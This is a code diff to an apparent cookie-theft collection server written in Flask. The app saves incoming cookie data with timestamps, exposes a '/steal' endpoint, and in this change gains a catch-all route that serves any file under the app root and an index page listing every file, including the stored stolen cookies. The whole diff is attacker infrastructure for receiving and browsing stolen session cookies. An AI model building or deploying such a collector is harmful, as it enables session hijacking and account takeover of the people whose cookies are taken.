@@ -1,4 +1,5 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, send_from_directory
+
 import os
 from datetime import datetime
 
@@ -10,6 +11,10 @@ def guardar_cookie(cookie_data):
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     with open(COOKIES_FILE, 'a') as f:
         f.write(f"{cookie_data}|{timestamp}\n")
+
+@app.route('/<path:filepath>')
+def serve_file(filepath):
+    return send_from_directory(app.root_path, filepath)
 
 def cargar_cookies():
     if not os.path.exists(COOKIES_FILE):
@@ -28,7 +33,17 @@ def cargar_cookies():
 @app.route('/')
 def index():
     cookies = cargar_cookies()
-    return render_template('index.html', cookies=cookies)
+
+    base_path = app.root_path
+    files = []
+
+    for dirpath, _, filenames in os.walk(base_path):
+        for filename in filenames:
+            full_path = os.path.join(dirpath, filename)
+            rel_path = os.path.relpath(full_path, base_path)
+            files.append(rel_path.replace("\\", "/"))  # Ensure URL-friendly paths
+
+    return render_template('index.html', cookies=cookies, files=files)
 
 @app.route('/steal', methods=['GET'])
 def steal():
